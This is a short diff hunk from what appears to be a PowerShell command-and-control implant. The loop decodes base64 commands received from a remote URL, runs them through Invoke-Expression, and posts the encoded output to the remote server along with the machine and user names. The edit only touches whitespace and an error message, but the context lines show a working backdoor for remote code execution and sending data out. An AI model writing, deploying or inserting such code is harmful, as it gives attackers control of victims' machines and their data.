@@ -11,11 +11,11 @@ while (1){
         Try {
             $a = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd))
             if ($a -eq "hold") { continue; }
-            $cmdO = Invoke-Expression $a;   
+            $cmdO = Invoke-Expression $a;  
             $cmdOutput = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($cmdO))
             $q= Invoke-RestMethod -Uri ($url + "out") -Method Post -Body $(@{ "hostname" = "$env:COMPUTERNAME" + "-$Env:UserName"; "out"= $cmdOutput} | ConvertTo-Json) -ContentType "application/json" 
         } catch {
-            $q= Invoke-RestMethod -Uri ($url + "out") -Method Post -Body $(@{ "hostname" = "$env:COMPUTERNAME" + "-$Env:UserName"; "out"= "error cmd"} | ConvertTo-Json) -ContentType "application/json"    
+            $q= Invoke-RestMethod -Uri ($url + "out") -Method Post -Body $(@{ "hostname" = "$env:COMPUTERNAME" + "-$Env:UserName"; "out"= "Error running command"} | ConvertTo-Json) -ContentType "application/json"    
         }
         
     } Catch {
